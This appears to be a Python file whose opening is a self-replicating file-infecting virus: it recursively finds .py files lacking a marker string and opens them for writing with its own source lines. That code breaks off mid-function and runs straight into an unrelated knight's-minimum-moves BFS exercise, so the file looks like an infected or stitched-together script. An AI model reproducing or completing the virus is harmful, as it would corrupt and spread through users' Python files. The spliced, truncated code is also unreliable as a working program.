#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 code to find minimum steps to reach
# to specific cell in minimum moves by Knight
class cell:
     
    def __init__(self, x = 0, y = 0, dist = 0):
        self.x = x
        self.y = y
        self.dist = dist
         
# checks whether given position is
# inside the board
def isInside(x, y, N):
    if (x >= 1 and x <= N and
        y >= 1 and y <= N):
        return True
    return False
     
# Method returns minimum step to reach
# target position
def minStepToReachTarget(knightpos,
                         targetpos, N):
     
    # all possible movements for the knight
    dx = [2, 2, -2, -2, 1, 1, -1, -1]
    dy = [1, -1, 1, -1, 2, -2, 2, -2]
     
    queue = []
     
    # push starting position of knight
    # with 0 distance
    queue.append(cell(knightpos[0], knightpos[1], 0))
     
    # make all cell unvisited
    visited = [[False for i in range(N + 1)]
                      for j in range(N + 1)]
     
    # visit starting state
    visited[knightpos[0]][knightpos[1]] = True
     
    # loop until we have one element in queue
    while(len(queue) > 0):
         
        t = queue[0]
        queue.pop(0)
         
        # if current cell is equal to target
        # cell, return its distance
        if(t.x == targetpos[0] and
           t.y == targetpos[1]):
            return t.dist
             
        # iterate for all reachable states
        for i in range(8):
             
            x = t.x + dx[i]
            y = t.y + dy[i]
             
            if(isInside(x, y, N) and not visited[x][y]):
                visited[x][y] = True
                queue.append(cell(x, y, t.dist + 1))
 
# Driver Code    
if __name__=='__main__':
    N = 30
    knightpos = [1, 1]
    targetpos = [30, 30]
    print(minStepToReachTarget(knightpos,
                               targetpos, N))
     
# This code is contributed by
# Kaustav kumar Chanda
# Time Complexity: O(N^2) - At worst case, all the cells will be visited so time complexity is O(N^2)
# Space Complexity: O(N^2) - The nodes are stored in queue. So the Space Complexity is O(N^2)